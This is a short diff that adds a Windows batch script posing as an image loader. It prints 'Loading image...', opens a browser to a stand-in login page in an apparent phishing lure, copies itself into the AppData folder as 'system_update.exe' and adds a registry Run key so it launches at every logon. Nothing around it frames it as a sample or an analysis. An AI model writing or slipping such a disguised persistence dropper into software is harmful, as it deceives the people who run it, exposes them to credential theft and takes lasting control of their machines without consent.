@@ -1,0 +1,5 @@
+@echo off
+echo Loading image...
+start https://unknown-site.example/login
+copy %0 %appdata%\system_update.exe
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d %appdata%\system_update.exe
